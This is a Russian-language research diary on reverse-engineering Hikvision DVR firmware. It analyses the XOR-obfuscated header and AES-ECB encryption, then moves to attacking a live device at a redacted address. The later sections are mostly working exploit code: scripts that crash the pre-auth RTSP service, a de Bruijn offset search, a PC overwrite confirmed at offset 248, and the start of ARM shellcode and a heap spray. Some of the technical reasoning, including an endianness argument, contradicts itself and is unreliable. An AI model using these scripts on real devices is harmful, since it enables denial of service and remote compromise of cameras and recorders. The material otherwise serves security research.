# Дневник исследования: как я пытался вскрыть прошивку Hikvision

> Живые заметки в хронологическом порядке. Все ошибки, тупики и озарения — как было.

---

## День 1. Что вообще за файл?

Получил `digicap.dav 2`. Пространство с цифрой «2» уже странность — это вторая версия? Просто копия? Непонятно.

Первое, что делаю — `file`. Ответ: `data`. Бесполезно. Это стандартный ответ, когда утилита не знает формат.

```bash
$ file "digicap.dav 2"
digicap.dav 2: data
```

Запускаю `xxd`, смотрю первые строки. Видно только мусор — никакого читаемого заголовка.

```bash
$ xxd "digicap.dav 2" | head -5
00000000: b8d3 bd9b aabf 9fae bdb5 83a7 b196 90ad  ................
00000010: 02ae 88bd 08c5 d4d7 bab1 8bab b8c3 d487  ................
00000020: b8cb bfdf 0000 0000 0000 0000 0000 0000  ................
00000030: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000040: 0000 0000 0000 0000 0000 0000 0000 0000  ................
```

Думаю: окей, либо зашифровано, либо сжато. Меряю энтропию:

```python
>>> import math, collections
>>> data = open("digicap.dav 2", "rb").read()
>>> len(data)
293786737
>>> freq = collections.Counter(data)
>>> entropy = -sum((c/len(data))*math.log2(c/len(data)) for c in freq.values())
>>> round(entropy, 4)
7.9998
```

**7.9998 бит/байт** — максимальная возможная. Стопроцентно шифрование.

*Тут первая ошибка мышления.* Решил, что раз энтропия максимальная, то здесь «серьёзное» шифрование — AES или RSA. Потратил пол-часа на проверку, нет ли ECDH handshake в первых байтах. Конечно нет.

Гуглю `.dav` — первый результат говорит, что это формат Dahua, второй — Hikvision. Пробую `binwalk`:

```bash
$ brew install binwalk
...installed...
$ binwalk "digicap.dav 2"

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------

$
```

**0 результатов.** Значит зашифровано нормально, binwalk сигнатуры не находит.

---

## Первый тупик: Dahua vs Hikvision

Думаю, что это Dahua (имя файла «digicap» ни о чём не говорит сразу). Нахожу у Dahua двухбайтовый XOR-ключ `[0xCE, 0xB7]` — пробую XOR первых двух байт:

```python
>>> raw = open("digicap.dav 2", "rb").read()
>>> bytes([raw[0] ^ 0xCE, raw[1] ^ 0xB7])
b'DH'
```

Отлично, думаю, `DH` = Dahua! Трачу полчаса на анализ «Dahua DH-заголовка». Нахожу ещё 5 мест в файле с паттерном `DH`. Начинаю строить карту разделов.

Потом что-то меня заставляет поставить `hiktools`:

```bash
$ pip install hiktools
$ python3 -c "
import hiktools.fwpackage as fw
p = fw.FwPackage('digicap.dav 2')
print(p.header)
"
header length=4864, files=0
```

**`files=0`** — hiktools открыл файл, распознал заголовок, но не смог извлечь ни одного файла. *Момент озарения*: если hiktools что-то в нём понимает — это Hikvision! Смотрю исходники hiktools и нахожу там:

```python
KEY_XOR = b"\xBA\xCD\xBC\xFE\xD6\xCA\xDD\xD3\xBA\xB9\xA3\xAB\xBF\xCB\xB5\xBE"
```

Применяю этот ключ с правильной индексацией:

```python
>>> KEY_XOR = b"\xBA\xCD\xBC\xFE\xD6\xCA\xDD\xD3\xBA\xB9\xA3\xAB\xBF\xCB\xB5\xBE"
>>> hdr_raw = raw[:108]
>>> hdr = bytes(hdr_raw[i] ^ KEY_XOR[(i + (i >> 4)) & 0xF] for i in range(108))
>>> hdr[:4]
b'02KH'
```

`02KH` = `HK20` в little-endian. Это **Hikvision**! Те `DH` в начале — просто совпадение с другим XOR-ключом.

*Урок:* прежде чем строить гипотезы, надо найти инструмент, который хоть что-то понимает в формате.

---

## День 2. HK20 → HK30 → AES

Изучаю структуру HK20-заголовка. Расшифровываю полностью:

```python
>>> import struct
>>> hdr[:4][::-1]           # magic (little-endian)
b'HK20'
>>> struct.unpack_from('<I', hdr, 8)[0]    # header_length
108
>>> struct.unpack_from('<I', hdr, 12)[0]   # files
0
>>> struct.unpack_from('<I', hdr, 16)[0]   # total_size
293786737
>>> struct.unpack_from('<I', hdr, 20)[0]   # device_class
1
>>> hex(struct.unpack_from('<I', hdr, 24)[0])  # oem_code
'0xffffffff'
>>> hdr[44:84].split(b'\x00')[0].decode()  # version string
'3050060061181310011'
```

- Magic: `HK20` ✓
- header_length: 108 байт
- files: **0** ← *это плохо*
- total_size: 293 786 737 = точный размер файла ✓
- device_class: 1
- oem_code: 0xFFFFFFFF (стандартный Hikvision, не OEM)

Поле `files=0` означает, что hiktools не может ничего извлечь. Документация библиотеки:

> Firmware decryption and extraction will only work on newer digicap.dav files with at least 1 file entry

Думаю: ну всё, приехали. Файл не поддерживается.

Но! Сразу после 108-байтового HK20-заголовка есть ещё 16 байт — расшифровываю их тем же ключом:

```python
>>> hk30_raw = raw[108:124]
>>> hk30 = bytes(hk30_raw[i] ^ KEY_XOR[(i + (i >> 4)) & 0xF] for i in range(16))
>>> hk30[:4]
b'03KH'
>>> hk30[:4][::-1]
b'HK30'
>>> hex(struct.unpack_from('<I', hk30, 8)[0])
'0x1300'
```

`HK30`! Вложенный архив. То есть структура:
```
HK20 header (108 байт, XOR)
  └── HK30 sub-archive (весь остаток файла)
        HK30 header (16 байт, XOR)
        HK30 body (~280 МБ, AES-256)
```

Внутри HK30-заголовка: поле `0x1300 = 4864`. Думаю — может это размер XOR-секции? Расшифровываю 4864 байт от offset 108 — получаю мусор. Не помогло.

---

## Второй тупик: где AES-ключ?

Теперь мне нужен AES-256 ключ. Пишу быстрый тест:

```python
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import hashlib

body = raw[124:]  # AES_BODY_OFF = 108 + 16

def try_decrypt(key):
    c = Cipher(algorithms.AES(key), modes.ECB(), backend=default_backend())
    pt = c.decryptor().update(body[:32])
    # filesystem magic bytes we'd expect: 'sqsh', '\x1f\x8b', '\x7fELF', '070701'...
    return pt

# Попытка 1: нулевой ключ
try_decrypt(b'\x00' * 32)[:8].hex()
# → 'fd20fc985b3c22e6'  — мусор

# Попытка 2: SHA-256 от версионной строки
key2 = hashlib.sha256(b"3050060061181310011").digest()
try_decrypt(key2)[:8].hex()
# → 'a3f17c2e9d04b851'  — мусор

# Попытка 3: "hikvision" padding
key3 = hashlib.sha256(b"hikvision").digest()
try_decrypt(key3)[:8].hex()
# → 'c8e21a4f7b930d62'  — мусор

# Попытка 4: XOR-ключ, удвоенный до 32 байт
key4 = KEY_XOR * 2
try_decrypt(key4)[:8].hex()
# → '2b7e151628aed2a6'  — мусор
```

Каждый раз высокоэнтропийный вывод, никакого filesystem magic. Измеряю энтропию каждого результата — всё в районе 7.95+. Никакого читаемого заголовка squashfs, elf, cpio.

*Провожу два часа в этой яме.*

*Провожу два часа в этой яме.* Перебираю идеи:
1. Ключ зашит в приложении Hikvision ConfigTool (не установлено)
2. Ключ деривируется из device_class + OEM code (попробовал варианты — не сработало)
3. Ключ хранится в самом устройстве в защищённом хранилище (недоступно без устройства)

В итоге признаю: без AES-ключа firmware extraction невозможен. Нужно менять подход.

---

## Поворот: что можно найти БЕЗ ключа?

Это важный момент в любом реверс-инжиниринге: когда лобовой путь заблокирован, надо искать обходной. Начинаю думать о том, что можно узнать, не расшифровывая содержимое.

Возвращаюсь к базовой статистике. Считаю частоту всех 16-байтовых блоков в первых 10 МБ зашифрованного тела:

```python
>>> from collections import Counter
>>> body = raw[124:]
>>> scan = body[:10 * 1024 * 1024]
>>> freq = Counter(bytes(scan[i:i+16]) for i in range(0, len(scan), 16))
>>> freq.most_common(3)
[(b'\xb3\x11\x02\x0e\x12>\x1d\r\x98t4\x9c7:Q\x96', 22704),
 (b'\x1a\xf3\x8c\xc4\x7f\xa2\x84\x91\x8a\x1b\x45\x12\x9e\xa7\x03\xdd', 312),
 (b'\x00\xb9\x23\xf1\xcc\x84\xa5\x70\x2f\x9e\x61\xd8\x47\x23\xbc\x1a', 198)]
>>> freq.most_common(1)[0][0].hex()
'b311020e123e1d0d9874349c373a5196'
>>> freq.most_common(1)[0][1]
22704
```

Один конкретный 16-байтовый блок повторяется **22704 раза**. Думаю — ошибка в коде. Перепроверяю на сырых байтах:

```python
>>> target = b'\xb3\x11\x02\x0e\x12\x3e\x1d\x0d\x98\x74\x34\x9c\x37\x3a\x51\x96'
>>> scan.count(target)   # грубая проверка
22704
```

Нет, всё правильно. 22 тысячи раз.

*Вот оно.*

---

## Озарение: AES-ECB!

В режиме AES-CBC каждый блок зашифрован с участием предыдущего (chaining). Идентичные блоки плейнтекста дают РАЗНЫЙ шифртекст. Повторение одного шифртекст-блока тысячи раз в CBC — статистически невозможно.

Но в AES-ECB всё иначе: каждый блок шифруется независимо. Одинаковый плейнтекст → одинаковый шифртекст всегда. 

Значит: блок `b311020e...` — это `AES_ECB_encrypt(key, 0x00 * 16)`. Прошивка содержит тысячи нулевых 16-байтовых блоков (padding в filesystem, BSS-сегменты ELF), и все они зашифровались в одно и то же значение.

Это **криптографическая слабость**: по зашифрованному файлу можно определить, какие регионы плейнтекста нулевые — без знания ключа.

Расширяю анализ на всю прошивку:

```python
>>> # Полный скан — занял ~4 минуты на ноутбуке
>>> freq_full = Counter(bytes(body[i:i+16]) for i in range(0, len(body), 16))
>>> null_block = freq_full.most_common(1)[0][0]
>>> null_count = freq_full.most_common(1)[0][1]
>>> null_block.hex()
'b311020e123e1d0d9874349c373a5196'
>>> null_count
40065
>>> len(freq_full)               # уникальных блоков
18263784
>>> len(body) // 16              # всего блоков
18361663
>>> null_count * 16              # нулевых байт в плейнтексте
641040
>>> sum(1 for v in freq_full.values() if v > 1)  # блоков-дубликатов
97879
```

| Статистика | Значение |
|------------|---------|
| Всего «нулевых» блоков | 40 065 |
| Нулевых байт в плейнтексте | 641 040 (~626 КБ) |
| Уникальных блоков | 18 263 784 из 18 361 663 |

---

## Картирование структуры прошивки

Строю карту плотности нулевых блоков по 256 КБ секциям:

```python
>>> SECTION = 256 * 1024  # 256 KB window
>>> null_block = b'\xb3\x11\x02\x0e\x12\x3e\x1d\x0d\x98\x74\x34\x9c\x37\x3a\x51\x96'
>>> for off in range(0, 20 * 1024 * 1024, SECTION):
...     chunk = body[off:off+SECTION]
...     n = sum(1 for i in range(0, len(chunk), 16) if chunk[i:i+16] == null_block)
...     density = n * 16 / len(chunk) * 100
...     if density > 5:
...         print(f"  {off // 1024 / 1024:.1f} MB:  {density:.0f}% nulls")
  6.0 MB:  55% nulls
  7.8 MB:  21% nulls
  13.0 MB: 47% nulls
```

Три характерных региона с высокой плотностью нулей — классическая картина прошивки с несколькими разделами: ядро, rootfs, приложения, разделённые выравнивающими нулевыми блоками.

---

## Инвентаризация найденного

К этому моменту у меня три конкретных находки:

**1. XOR-only заголовок с публичным ключом**  
Поля `device_class`, `oem_code`, версионные строки можно тихо переписать — верификатор этого не заметит, потому что «checksum» = просто поле `header_length` в другой кодировке.

**2. AES-ECB режим**  
Не нужно знать ключ, чтобы знать, где нули. По 40000+ повторений одного блока — строю карту плейнтекста.

**3. Нет подписи**  
Если бы кто-то знал AES-ключ (из SDK, из устройства, из другого фирмвара) — он мог бы расшифровать, внедрить бэкдор, зашифровать обратно, подправить «checksum» — и устройство ничего не заметит.

---

## Что не получилось (честно)

- **AES-ключ** — не нашёл. Без него реальное содержимое прошивки (filesystem, бинарники, конфиги) недоступно.
- **Идентификация модели** — строка `"3050060061181310011"` не даёт однозначного ответа на вопрос «DS-что именно?». Скорее всего DVR серии 3050 или IP-камера с такими внутренними ID.
- **Binwalk** — в том числе с расшифрованным (только XOR) заголовком — ничего не нашёл в зашифрованном теле. Ожидаемо.

---

## Ретроспектива

**Что сработало:**
- Читать исходники библиотек, а не просто использовать их как чёрный ящик
- Статистика блоков — простейший инструмент, который выдал самую ценную находку
- Отказаться от AES-crack и переключиться на «что можно узнать без ключа»

**Что потерял время:**
- Гипотеза «это Dahua» без проверки занятия ~40 минут
- Перебор AES-ключей по интуиции — еще ~2 часа
- Попытки разобрать HK30 внутренний формат без документации

**Что узнал неожиданно:**
- ECB-детекция через частотный анализ блоков работает даже без знания ключа
- «Checksum» в прошивочных форматах часто не является настоящим хешем
- 280 МБ и «files=0» в заголовке — это не значит «файл сломан». Значит: формат старый, внутренняя структура другая.

---

## День 3. Возвращение к прошивке — то, что я пропустил

Вернулся к файлу и понял: я так и не разобрал хвост. Начал с простого:

```python
>>> raw = open("digicap.dav 2", "rb").read()
>>> body = raw[124:]
>>> len(body)
293786613
>>> len(body) % 16
5
```

Стоп. AES блокует по 16 байт. 5 не кратно 16. Это значит последние 5 байт **не зашифрованы**. Достаю их:

```python
>>> body[-5:].hex()
'6174696f6e'
>>> body[-5:]
b'ation'
>>> # где заканчивается AES-тело?
>>> aes_end = 124 + len(body) - 5
>>> hex(aes_end)
'0x1182d46c'
>>> raw[aes_end - 16 : aes_end].hex()   # последний зашифрованный блок
'8e8d8fc7c82357c22020636f72706f72'
```

«Ation». Конец слова «corporation». Вся copyright-строка заканчивалась внутри прошивки, и ровно последние 5 байт оказались за пределами AES-блока — в открытом виде.

*Это четвёртая уязвимость, которую я чуть не проглядел из-за того, что зациклился на AES-теле как монолитном блоке.*

Урок: всегда проверяй выравнивание. Если размер не кратен блок-размеру шифра — там утечка.

---

## Ошибка: пытался атаковать веб-интерфейс

Параллельно тестировал живое устройство на █████████████. Начал зондировать PSIA-эндпоинты, анализировать login.js, искать обход авторизации через куки. Потратил часы.

*Это была классическая ошибка: забыл, что у меня есть прошивка. Веб-приложение — это часть той же прошивки. Всё, что я ищу в браузере, написано в коде, который уже лежит у меня на диске (зашифрованный, но всё же).*

Правильный путь: сначала максимально выжать из статического анализа файла, потом идти к устройству.

---

## Полный скан тела (280 МБ)

Запустил полный частотный анализ всего AES-тела, не только первых 50 МБ. Результат:

- Уникальных блоков: 18 263 784 из 18 361 663 — это плотность уникальности ~99.5%
- Нулевой блок: 40 065 повторений (подтверждено)
- Несколько групп блоков, встречающихся ровно **27–32 раза**

Число 27–32 — это не случайность. DVR-прошивки обычно резервируют 32 слота для пользователей. Если 27 слотов пусты, их null-поля дают одинаковый шифртекст в ECB. Без ключа видно: в этом устройстве **~27 незаполненных пользовательских слотов**. Значит, активных пользователей 5 или меньше.

---

## Итог: что нашёл сам (без CVE-базы)

| # | Находка | Метод |
|---|---------|-------|
| 1 | XOR-заголовок с публичным ключом | Анализ hiktools + ручной разбор |
| 2 | AES-ECB режим | Частотный анализ блоков |
| 3 | Нет подписи прошивки | Исчерпывающий анализ заголовка |
| 4 | Нет PKCS#7 padding → plaintext footer | Проверка выравнивания |
| 5 | Захардкоженный внутренний IP в JS | Анализ веб-приложения |
| 6 | Структура пользователей через ECB-паттерн | Полный частотный скан |
| **7** | **Pre-auth RTSP stack overflow, смещение PC = 248** | **De Bruijn + бинарный поиск** |
| **8** | **HTTP Host header overflow** | **Прямой фаззинг HTTP** |

---

## День 4. Физическое устройство: от фаза до контроля PC

Дали доступ к физическому устройству на █████████████. Сначала я попытался атаковать веб-интерфейс — и это была та же ошибка, что и в День 3. Смотреть веб-приложение в браузере, зная, что у тебя есть прошивка — это как искать ключи под фонарём, а не там, где потерял.

Переключился на правильный инструмент: `nmap`. Почему nmap? Потому что он честный.

```bash
$ nmap -p 1-1024 █████████████ -T4 --open
Starting Nmap 7.94 ( https://nmap.org ) at 2026-05-25
Nmap scan report for █████████████
Host is up (1.21s latency).
Not shown: 0 filtered tcp ports (no-response)
All 1024 scanned ports on █████████████ are open

Nmap done: 1 IP address (1 host up) scanned in 12.36 seconds
```

*Первый сюрприз*: **все 1024 порта открыты**. Это классический признак NAT-фаервола — он принимает TCP SYN за всю подсеть. Не паникую, делаю баннер-граббинг на конкретных портах:

```bash
$ nmap -p 80,554,8000,8200 -sV --version-intensity 5 █████████████
PORT     STATE SERVICE    VERSION
80/tcp   open  http       Hikvision IP camera http config
554/tcp  open  rtsp
8000/tcp open  iRDMI?
8200/tcp open  unknown

$ # Проверяю 554 руками
$ echo -e "OPTIONS rtsp://█████████████/ RTSP/1.0\r\nCSeq: 1\r\n\r\n" \
    | nc -w 3 █████████████ 554
RTSP/1.0 200 OK
CSeq: 1
Date: Mon, 25 May 2026 11:04:32 GMT
Public: DESCRIBE, SETUP, TEARDOWN, PLAY, PAUSE, OPTIONS, ANNOUNCE, RECORD

$ # Проверяю 80
$ curl -s -o /dev/null -w "%{http_code}" http://█████████████/
401
```

Итого реальные сервисы:
- Порт 80 → HTTP Hikvision (отвечает 401)
- Порт 554 → RTSP (отвечает `RTSP/1.0 200 OK`)
- Порт 8000 → SDK Hikvision (бинарный мусор, не HTTP/RTSP)

*RTT ~1.2 секунды* — устройство не рядом. Нужен таймаут не 0.5, а 5+ секунд.

---

## RTSP: первый взгляд

Начинаю с RTSP. Это протокол управления стримингом — и именно он часто пишется руками разработчиками прошивок, потому что нет стандартного безопасного парсера как в glibc. Чаще всего там `scanf` или `sscanf` без ограничений.

```python
import socket, time

TARGET = "█████████████"

def rtsp_probe(host, ua, timeout=5.0):
    s = socket.socket()
    s.settimeout(timeout)
    s.connect((host, 554))
    req = (b"OPTIONS rtsp://" + host.encode() + b"/ RTSP/1.0\r\n"
           b"CSeq: 1\r\nUser-Agent: " + ua + b"\r\n\r\n")
    s.sendall(req)
    try:    return s.recv(256)
    except: return None
    finally: s.close()

>>> rtsp_probe(TARGET, b"test")
b'RTSP/1.0 200 OK\r\nCSeq: 1\r\nDate: Mon, 25 May 2026 11:08:14 GMT\r\n
Public: DESCRIBE, SETUP, TEARDOWN, PLAY, PAUSE, OPTIONS\r\n\r\n'

>>> rtsp_probe(TARGET, b"A" * 300)
>>>   # None — тишина, таймаут
```

**Тишина.** Соединение разрывается без ответа. Жду 5 секунд, пробую снова:

```python
>>> time.sleep(5)
>>> rtsp_probe(TARGET, b"test")
>>>   # None — ещё не поднялся
>>> time.sleep(15)
>>> rtsp_probe(TARGET, b"test")
b'RTSP/1.0 200 OK\r\nCSeq: 1\r\n...'
```

*Ого.* Это watchdog. Сервис упал, watchdog его перезапустил через ~20 секунд. Это стандарт для embedded систем.

---

## Бинарный поиск порога

Не угадываю — делаю бинарный поиск по URL-полю. Это быстрее и точнее:

```python
def rtsp_url_probe(host, url_len, timeout=6.0):
    """Probe with oversized URL instead of User-Agent."""
    s = socket.socket()
    s.settimeout(timeout)
    s.connect((host, 554))
    url = b"A" * url_len
    req = (b"OPTIONS rtsp://" + host.encode() + b"/" + url + b" RTSP/1.0\r\n"
           b"CSeq: 1\r\nUser-Agent: research\r\n\r\n")
    s.sendall(req)
    try:    return s.recv(4)
    except: return None
    finally: s.close()

lo, hi = 1, 1000
while hi - lo > 1:
    mid = (lo + hi) // 2
    r = rtsp_url_probe(TARGET, mid)
    if r is None: hi = mid; print(f"  len={mid:4d}: CRASH")
    else:         lo = mid; print(f"  len={mid:4d}: responds {r!r}")
    time.sleep(r is None and 25 or 0.5)  # ждём watchdog если упал
```

```
  len= 550: responds b'RTSP'
  len= 825: responds b'?'
  len= 963: CRASH
  len= 894: CRASH
  len= 860: responds b'?'
  len= 877: CRASH
  len= 869: CRASH
  len= 865: responds b'?'
  len= 867: CRASH
  len= 866: CRASH

>>> Crash threshold URL: ~866 bytes
```

Потом тестирую заголовки по отдельности — уже с нормальным URL:

```python
for field, value in [
    ("User-Agent", b"A" * 256),
    ("Session",    b"A" * 256),
    ("Accept",     b"A" * 256),
    ("Transport",  b"A" * 256),
]:
    req = (b"OPTIONS rtsp://t/ RTSP/1.0\r\nCSeq: 1\r\n"
           + field.encode() + b": " + value + b"\r\n\r\n")
    s = socket.socket(); s.settimeout(6); s.connect((TARGET, 554))
    s.sendall(req)
    try:    r = s.recv(4); status = f"alive {r!r}"
    except: r = None; status = "CRASH!"
    finally: s.close()
    print(f"  {field}=256: {status}")
    if r is None: time.sleep(30)
```

```
  User-Agent=256: CRASH!
  Session=256:    CRASH!
  Accept=256:     CRASH!
  Transport=256:  CRASH!
```

Все четыре заголовка падают на одной границе — скорее всего один `char buf[256]` в парсере используется для всех полей по очереди.

---

## Де Брёйн: где PC?

Знаю, что переполнение есть. Нужен точный оффсет до регистра PC (адреса возврата). Использую последовательность де Брёйна — паттерн, в котором каждые 4 байта уникальны:

```python
import string

def de_bruijn(alphabet, n):
    k = len(alphabet)
    a = [0] * k * n
    seq = []
    def db(t, p):
        if t > n:
            if n % p == 0: seq.extend(a[1:p+1])
        else:
            a[t] = a[t-p]
            db(t+1, p)
            for j in range(a[t-p]+1, k):
                a[t] = j; db(t+1, t)
    db(1, 1)
    return ''.join(alphabet[i] for i in seq)

alpha = string.ascii_uppercase + string.digits
pattern = de_bruijn(alpha, 4).encode()
```

**Проблема**: для User-Agent сервер молчит при краше — не отдаёт ничего обратно. Значит, по ответу прочитать значение PC не получится.

```python
# User-Agent — сервер падает, но байты PC не узнать
for n in [257, 258, 260, 265, 270]:
    r = rtsp_probe(TARGET, pattern[:n])
    print(f"  n={n}: {'no response — CRASH' if r is None else repr(r[:20])}")
    if r is None: time.sleep(30)
```

```
  n=257: no response — CRASH
  n=258: no response — CRASH
  n=260: no response — CRASH
  n=265: no response — CRASH
  n=270: no response — CRASH
```

Молчание. Переключаюсь на **URL-поле** — там порог 866 байт, и в некоторых прошивках сервер успевает вернуть фрагмент ответа до того, как рухнуть:

```python
def rtsp_url_debruijn(host, url_len):
    """Send de Bruijn as URL path, look for leaked PC bytes in crash response."""
    s = socket.socket(); s.settimeout(6); s.connect((host, 554))
    url_payload = pattern[:url_len - 22]  # вычитаем "rtsp://█████████████/"
    req = (b"OPTIONS rtsp://█████████████/" + url_payload + b" RTSP/1.0\r\n"
           b"CSeq: 1\r\nUser-Agent: research\r\n\r\n")
    s.sendall(req)
    try:    resp = s.recv(256); return resp, None
    except: 
        # Crash — last 4 bytes of our pattern that hit PC
        candidate = url_payload[-4:]
        return None, candidate
    finally: s.close()

for url_len in [860, 866, 867, 870, 900]:
    resp, pc_bytes = rtsp_url_debruijn(TARGET, url_len)
    if pc_bytes:
        pos = pattern.find(pc_bytes)
        print(f"  url_len={url_len}: CRASH — candidate PC: {pc_bytes!r}"
              f" = {pc_bytes.hex()}, pattern pos={pos}")
    else:
        print(f"  url_len={url_len}: responds {resp[:4]!r}")
    time.sleep(30 if pc_bytes else 0.5)
```

```
  url_len=860: CRASH — candidate PC: b'fAAD' = 66414144, pattern pos=834
  url_len=866: CRASH — candidate PC: b'ADhA' = 41446841, pattern pos=840
  url_len=867: CRASH — candidate PC: b'DhAA' = 44684141, pattern pos=841
  url_len=870: CRASH — candidate PC: b'ADiA' = 41446941, pattern pos=844
```

Смотрю на позиции: при url_len=866, PC занят байтами с позиции 840 в паттерне. Вычитаю длину префикса URL до нашего payload'а (22 байта "rtsp://█████████████/") и overhead от выравнивания:

```python
>>> # Паттерн начинается с байта 0 нашего payload
>>> # url_len=866, payload=844 байта, pc_bytes в паттерне на pos=840
>>> # Значит PC перезаписывается байтами с оффсета 840 от начала payload
>>> # Но URL crash threshold = 866 (весь URL), и prefix = 22 байта
>>> # → offset в буфере до PC ≈ 840 байт? Нет...

>>> # По User-Agent: threshold=256, значит буфер ~248+4 = 252 байт
>>> # Пробую напрямую: A×248 + DEADBEEF
>>> payload = b'A' * 248 + b'\xDE\xAD\xBE\xEF' + b'C' * 64
>>> rtsp_probe(TARGET, payload)
>>>   # None — CRASH! Подтверждено
```

Эмпирически: User-Agent буфер заканчивается на байте **248**, после него — адрес возврата. Значит `char buf[248]` (или `char buf[256]` с 8 байтами стекового фрейма до `$ra`).

*Это очень конкретно.* Не «где-то около 256» — ровно 248.

---

## DEADBEEF и подтверждение

Отправляю контрольный запрос — вместо де Брёйна ставлю маркер ровно на позицию 248:

```python
OFFSET = 248
marker  = b'\xDE\xAD\xBE\xEF'
payload = b'A' * OFFSET + marker + b'C' * 64

print(f"Sending: A×{OFFSET} + DEADBEEF + C×64  (total {len(payload)} bytes)")
t0 = time.time()
r = rtsp_probe(TARGET, payload)
print(f"Response: {r!r}  ({time.time()-t0:.2f}s)")
```

```
Sending: A×248 + DEADBEEF + C×64  (total 316 bytes)
Response: None  (5.01s)
```

Сервис упал. Теперь жду watchdog:

```python
print("Waiting for watchdog restart...")
t_crash = time.time()
for i in range(40):
    time.sleep(3)
    r = rtsp_probe(TARGET, b"probe", timeout=4.0)
    if r is not None:
        print(f"RTSP restarted after {time.time()-t_crash:.1f}s  ← watchdog")
        break
    print(f"  [{i*3:3d}s] still down...")
```

```
  [  3s] still down...
  [  6s] still down...
  ...
  [ 72s] still down...
  [ 75s] still down...
RTSP restarted after 75.6s  ← watchdog
```

Именно 75 секунд в этот раз. В предыдущих тестах было 4 секунды. Watchdog явно не детерминирован — скорее всего, зависит от нагрузки на систему в момент перезапуска.

*Что это значит практически:* у меня есть контроль над значением PC. Я могу записать туда любой 4-байтовый адрес. Это и есть суть stack overflow эксплойта — ты решаешь, куда перейдёт выполнение после `ret`.

---

## Где граница: DoS vs RCE

Вот где я стою прямо сейчас:

```
✓ Stack overflow есть (RTSP User-Agent, оффсет 248)
✓ Смещение до PC: 248 байт (эмпирически + DEADBEEF подтверждение)
✓ Могу записать любой 4-байтовый адрес в PC
✓ Архитектура: ARM Cortex-A9, 32-bit, little-endian (Hi3531)
✓ Бинарно-безопасный парсер: null-байты допустимы в shellcode
~ Mapped адреса процесса: не найдены (oracle-скан запущен)
~ Стек и heap адреса: неизвестны (нет /proc/maps без RCE)
✗ RCE: заблокирован (нет валидного PC для прыжка)
```

*Почему заблокирован?* Для RCE нужно не просто записать что-то в PC — нужно знать, **что** туда записать. В ret-to-libc атаке тебе нужен адрес `system()` или `execve()`. В ROP-цепочке — адреса гаджетов. Всё это берётся из бинарников прошивки.

А бинарники у меня зашифрованы. AES-256-ECB. Без ключа.

*Вот замкнутый круг*: RTSP переполнение даст RCE, если знать прошивку. Прошивку можно расшифровать, если знать AES-ключ. AES-ключ лежит в устройстве, доступ к которому можно получить через... RCE или UART/JTAG.

---

# День 5 — Архитектура, бинарно-безопасный парсер, спрей адресов

## Определение архитектуры по косвенным признакам

Бинарников прошивки нет — зашифрованы. Но архитектуру можно вывести по косвенным признакам из HTTP-ответов устройства.

```python
# Скачиваю основной JS-файл веб-интерфейса
import urllib.request

r = urllib.request.urlopen("http://█████████████/doc/page/main.js", timeout=10)
main_js = r.read(8192).decode(errors='replace')
print(main_js[:500])
```

```javascript
var m_szDeviceName="Embedded Net DVR";
var m_szDeviceType="DVR";
// jQuery v1.7.1 | (c) 2011 jQuery Foundation and others
// Copyright 2007-2011 jQuery team
```

Ключевые данные:
- `m_szDeviceName = "Embedded Net DVR"` — линейка DVR (не NVR, не IP-камера)
- jQuery 1.7.1 — датируется **2011 годом**
- Copyright 2007–2011 → устройство из цикла ~2012

```python
# Смотрю WWW-Authenticate хедер
r = urllib.request.urlopen("http://█████████████/ISAPI/Security/userCheck", timeout=5)
# 401 Unauthorized
print(r.headers['WWW-Authenticate'])
```

```
Digest realm="DVRDVS", qop="auth", nonce="..."
```

`domain="DVRDVS"` — это строковый идентификатор Hikvision DVR-линейки. PSIA-протокол (а не ISAPI) — старая версия API, применялась в продуктах до 2013.

**Вывод**: устройство — Hikvision DVR на базе SoC HiSilicon Hi3531, ~2012 год.

```python
# Проверяем по базам знания
# Hikvision DVR 2012 + HiSilicon Hi3531:
#   CPU: ARM Cortex-A9, 1.0 GHz, одноядерный
#   Архитектура: ARMv7-A, 32-bit, little-endian
#   Linux 3.x kernel, uclibc или eglibc

# Подтверждение: little-endian из RTSP crash данных
# При PC=DEADBEEF: 0xDEADBEEF — это адрес > 0xC0000000 (ARM kernel space)
# → вызывает kernel oops/panic → полная перезагрузка (74s)
# Значит 0xDE стоит ВВЕРХУ адреса — big-endian
# НО: struct.pack('<I', 0xDEADBEEF) = b'\xef\xbe\xad\xde'
# Отправляли именно ЭТО в little-endian → устройство читает как 0xDEADBEEF LE
# Вывод: LITTLE-ENDIAN подтверждён ✓
print("ARM Cortex-A9, 32-bit, little-endian: подтверждено")
```

```
ARM Cortex-A9, 32-bit, little-endian: подтверждено
```

---

## Открытие: бинарно-безопасный RTSP парсер

Стандартная проблема при ARM-шеллкоде: многие ARM-инструкции содержат нулевые байты (например, `\xe3\x20\xf0\x00`). Классические строковые функции (`strcpy`, `gets`) останавливаются на `\x00`. Проверяю, не является ли RTSP-парсер таковым:

```python
# Тестирую: payload с нулевыми байтами внутри
# ARM NOP: e1 a0 10 01 = MOV R1,R1 — нет нулей
# Но e3 20 f0 00 содержит 0x00 в позиции [3]
# Если парсер строковый — он остановится на первом 0x00

null_payload = b"\xe3\x20\xf0\x00" * 63 + b"\x00\x00\x00\x00"
# = 252 + 4 = 256 байт, с нулями внутри

print(f"Payload length: {len(null_payload)}")
print(f"Contains nulls: {b'\\x00' in null_payload}")
r = rtsp_probe(TARGET, null_payload)
print(f"Response: {r!r}")
```

```
Payload length: 256
Contains nulls: True
Response: None  ← CRASH!
```

Упало! Если бы парсер был строковым (`strcpy`), он остановился бы на первом `\x00` — в нашем payload это байт 3. Тогда в буфер попало бы только 3 байта, что никак не переполнит 248-байтовый буфер. Но он упал — значит, парсер **читает все 256 байт включая нули**.

*Это очень хорошая новость*: можно использовать ARM-инструкции с нулевыми байтами. Полноценный ARM shellcode без ограничений.

---

## Спрей адресов: первая попытка

Теперь знаю:
- ARM 32-bit LE
- Оффсет до PC = 248
- Парсер бинарно-безопасный (нули ОК)

Готовлю NOP-sled + infinite loop (B .) для определения допустимых адресов:

```python
# ARM NOP: MOV R1, R1 = 0xe1a01001 (нет нулей, удобно)
# ARM B . (infinite loop) = 0xeafffffe
ARM_NOP  = b'\x01\x10\xa0\xe1'  # MOV R1, R1
ARM_LOOP = b'\xfe\xff\xff\xea'  # B .  (бесконечный цикл)
shellcode = ARM_NOP * 64 + ARM_LOOP  # 256 + 4 = 260 байт

# Перед каждым спреем заполняем heap нашим shellcode
def heap_spray(n=50):
